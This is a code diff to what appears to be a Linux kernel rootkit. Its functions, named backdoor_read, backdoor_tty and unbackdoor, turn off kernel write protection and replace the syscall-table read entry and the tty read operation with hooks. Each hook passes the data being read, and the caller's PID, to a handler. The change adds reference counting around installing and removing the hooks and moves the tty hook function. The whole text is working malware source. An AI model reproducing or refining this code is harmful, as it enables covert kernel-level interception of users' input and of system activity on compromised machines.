@@ -14,9 +14,11 @@ ssize_t (*current_tty_read)(struct file *, char *, size_t, loff_t *);
 void
 backdoor_read(void)
 {
-    disable_protection();
-    sys_calls[__NR_read] = (void *)g7_read;
-    enable_protection();
+    if (atomic_inc_return(&read_install_count) == 1) {
+        disable_protection();
+        sys_calls[__NR_read] = (void *)g7_read;
+        enable_protection();
+    }
 }
 
 void
@@ -31,6 +33,16 @@ backdoor_tty(void)
             = (void *)g7_tty_read;
         enable_protection();
     }
+}
+
+ssize_t
+g7_tty_read(struct file *file, char *buf, size_t count, loff_t *off)
+{
+    atomic_inc(&tty_read_count);
+    ssize_t ret = current_tty_read(file, buf, count, off);
+    handle_pid(current->pid, buf, count);
+    atomic_dec(&tty_read_count);
+    return ret;
 }
 
 void
@@ -51,25 +63,17 @@ unbackdoor(void)
 
         current_tty_read = NULL;
     } else if (sys_read) {
-        disable_protection();
-        sys_calls[__NR_read] = (void *)sys_read;
-        enable_protection();
+        if (atomic_dec_return(&read_install_count) < 1) {
+            disable_protection();
+            sys_calls[__NR_read] = (void *)sys_read;
+            enable_protection();
 
-        // Sleeping here is very important, as without it
-        // we would stall the CPU..
-        while ((cur = atomic_read(&read_count)) > 0) {
-            DEBUG_INFO("Waiting for %d tasks", cur);
-            msleep(250);
+            // Sleeping here is very important, as without it
+            // we would stall the CPU..
+            while ((cur = atomic_read(&read_count)) > 0) {
+                DEBUG_INFO("Waiting for %d tasks", cur);
+                msleep(250);
+            }
         }
     }
-}
-
-ssize_t
-g7_tty_read(struct file *file, char *buf, size_t count, loff_t *off)
-{
-    atomic_inc(&tty_read_count);
-    ssize_t ret = current_tty_read(file, buf, count, off);
-    handle_pid(current->pid, buf, count);
-    atomic_dec(&tty_read_count);
-    return ret;
 }
